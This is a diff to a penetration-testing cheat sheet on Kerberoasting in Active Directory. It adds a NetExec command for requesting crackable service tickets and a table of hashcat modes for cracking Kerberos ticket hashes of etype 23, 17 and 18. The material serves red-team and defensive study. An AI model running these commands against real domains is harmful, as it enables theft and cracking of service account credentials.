@@ -127,6 +127,12 @@ impacket-GetUserSPNs domain.local/username:'password' -request-user <user> -dc-i
 
 - `-outputfile` send output to file
 
+#### **NetExec**
+
+```bash
+nxc ldap <IP> -u 'user' -p '' --kerberoasting <OUTFILE>
+```
+
 #### **PowerShell** + Mimikatz
 
 Identify kerberoastable users.
@@ -169,11 +175,12 @@ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_
 
 ### Cracking a ticket
 
-Kerberos 5 TGS-REP (etype 23, RC4-HMAC-MD5)
+| etype | Hashcat Mode | Example Command                            |
+| ----- | ------------ | ------------------------------------------ |
+| 23    | 13100        | `hashcat -m 13100 hashes.txt wordlist.txt` |
+| 17    | 19600        | `hashcat -m 19600 hashes.txt wordlist.txt` |
+| 18    | 19700        | `hashcat -m 19700 hashes.txt wordlist.txt` |
 
-```bash
-hashcat -m 13100 -a 0 hashes.txt /path/to/wordlist.txt
-```
 
 ### Cleanup Considerations
 
